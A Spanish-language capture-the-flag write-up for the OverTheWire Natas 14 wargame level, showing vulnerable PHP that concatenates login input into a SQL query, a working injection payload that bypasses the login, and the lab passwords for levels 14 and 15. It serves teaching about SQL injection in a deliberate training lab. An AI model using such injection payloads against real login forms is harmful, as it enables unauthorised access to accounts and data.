# Natas 14

#### URL: http://natas14.natas.labs.overthewire.org/
#### Credenciales: natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

Una inyeccion SQL clasica, la entrada del usuario se agrega a la peticion sin sanitizar

``` php
 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

Si escribimos en username `" OR '1' = '1'; -- ` y nada en password por ejemplo, se expande a: 
``` php
$query = "SELECT * from users where "" OR '1' = '1'; --`and password="";
```

Notese que despues de: lo que queda es un comentario y la peticion ahora devuelve todas las filas y por lo tanto el login es valido
``` php
    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
```

![2025-03-20-142636_607x166_scrot](https://github.com/user-attachments/assets/40f56aed-5c7a-4d44-b3c5-1e54cd0e4ebf)

`natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`

PD: 
- Nótese que se estan usando comillas dobles para encerrar la entrada de usuario por eso la inyeccion comienza con " y no con '
- Nótese el espacio al final de '--' sin el cual el comentario no funcionará
